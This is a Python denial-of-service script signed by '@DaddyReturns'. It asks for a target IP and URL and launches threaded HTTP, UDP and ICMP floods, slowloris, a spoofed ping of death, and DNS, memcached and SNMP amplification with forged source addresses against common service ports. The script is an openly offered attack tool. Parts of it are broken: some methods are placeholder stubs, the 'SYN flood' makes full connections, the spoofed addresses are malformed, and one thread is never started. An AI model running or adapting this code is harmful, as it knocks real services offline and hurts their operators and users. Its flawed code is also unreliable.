import requests
import threading
import random
import time
import socket
from scapy.all import *

def your_custom_ddos_method1(ip, port):
    while True:
        try:
            print(f"Executing Your Custom DDoS Method 1 on {ip}:{port}")
            time.sleep(random.uniform(0.01, 0.1)) 
        except Exception as e:
            print(f"Error: {e}")

def your_custom_ddos_method2(ip, port):
    while True:
        try:
            print(f"Executing Your Custom DDoS Method 2 on {ip}:{port}")
            time.sleep(random.uniform(0.01, 0.1))  # Add a dash of unpredictability
        except Exception as e:
            print(f"Error: {e}")
            
def pandemonium_havoc_attack(url):
    while True:
        try:
            headers = {
                'User-Agent': f'Mozilla/5.0 (Windows NT {random.randint(5, 10)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{random.randint(100, 200)} Safari/537.36',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive'
            }
            payload = "A" * random.randint(5000, 10000)
            response = requests.post(url, data={'data': payload}, headers=headers)
            print(f"Pandemonium Havoc Matrix assaulting {url} - Response code: {response.status_code}")
            time.sleep(random.uniform(0.01, 0.1))
        except Exception as e:
            print(f"Error: {e}")

def http_flood(url):
    while True:
        try:
            headers = {'User-Agent': f'Mozilla/5.0 (Windows NT {random.randint(5, 10)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{random.randint(100, 200)} Safari/537.36'}
            response = requests.get(url, headers=headers)
            print(f"HTTP Flood on {url} - Response code: {response.status_code}")
        except Exception as e:
            print(f"Error: {e}")

def syn_flood(ip, port):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            s.sendto(b'GET / HTTP/1.1\r\n', (ip, int(port)))
            s.close()
            print(f"SYN Flood on {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")

def udp_flood(ip, port):
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(b'A' * random.randint(100, 200), (ip, int(port)))  
            sock.close()
            print(f"UDP Flood on {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")

def slowloris_attack(ip, port):
    while True:
        try:
            headers = {
                'User-Agent': f'Mozilla/5.0 (Windows NT {random.randint(5, 10)}; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.{random.randint(100, 200)} Safari/537.36',
                'Connection': 'keep-alive',
                'Keep-Alive': 'timeout=5, max=1000',
                'Content-Length': '42'
            }
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, int(port)))
            s.sendall(f"GET /?{random.randint(1, 1000)} HTTP/1.1\r\n".encode())
            for header in headers:
                s.sendall(f"{header}: {headers[header]}\r\n".encode())
            print(f"Slowloris Attack on {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")

def ping_of_death(ip):
    while True:
        try:
            send(IP(dst=ip, src=f"{socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))}") / ICMP() / ("X" * 60000), verbose=False)
            print(f"Ping of Death on {ip}")
        except Exception as e:
            print(f"Error: {e}")

def memcached_amplification_attack(ip, port):
    try:
        
        packet = IP(dst=ip, src="".join(str(random.randint(0, 255)) for _ in range(4))) / UDP(dport=int(port), sport=random.randint(1024, 65535)) / \
                 Raw(load="\x00\x00\x00\x00\x00\x01\x00\x00stats\r\n")


        send(packet, verbose=False)
        print(f"Memcached Amplification Attack on {ip}:{port}")
    except Exception as e:
        print(f"Error: {e}")

def dns_amplification_attack(ip, port):
    try:

        packet = IP(dst=ip, src="".join(str(random.randint(0, 255)) for _ in range(4))) / UDP(dport=int(port), sport=random.randint(1024, 65535)) / \
                 DNS(rd=1, qd=DNSQR(qname="example.com", qtype="A", qclass="IN"))
        send(packet, verbose=False)
        print(f"DNS Amplification Attack on {ip}:{port}")
    except Exception as e:
        print(f"Error: {e}")

def icmp_flood(ip):
    while True:
        try:
            send(IP(dst=ip) / ICMP(), verbose=False)
            print(f"ICMP Flood on {ip}")
        except Exception as e:
            print(f"Error: {e}")

def snmp_amplification_attack(ip, port):
    try:
        packet = IP(dst=ip, src="".join(str(random.randint(0, 255)) for _ in range(4))) / UDP(dport=int(port), sport=random.randint(1024, 65535)) / \
                 SNMP(community="public", PDU=SNMPget(varbindlist=[SNMPvarbind(oid=ASN1_OID("1.3.6.1.2.1.1.1.0"))]))

        send(packet, verbose=False)
        print(f"SNMP Amplification Attack on {ip}:{port}")
    except Exception as e:
        print(f"Error: {e}")

def beast_mode_attack(ip, port):
    while True:
        try:
            print(f"Beast Mode Attack on {ip}:{port}")
        except Exception as e:
            print(f"Error: {e}")


target_ip = input("Enter the target IP: ")
url = input("Enter the target URL: ")

target_ports = [80, 443, 22, 8080, 3389]  
for port in target_ports:
    for attack_module in [pandemonium_havoc_attack, http_flood, syn_flood, udp_flood, slowloris_attack, ping_of_death,
                          memcached_amplification_attack, dns_amplification_attack, icmp_flood, snmp_amplification_attack,
                          beast_mode_attack, your_custom_ddos_method1, your_custom_ddos_method2]:
        threading.Thread(target=attack_module, args=(url,)) if attack_module == pandemonium_havoc_attack else threading.Thread(target=attack_module, args=(target_ip, port)).start()

#Regards: @DaddyReturns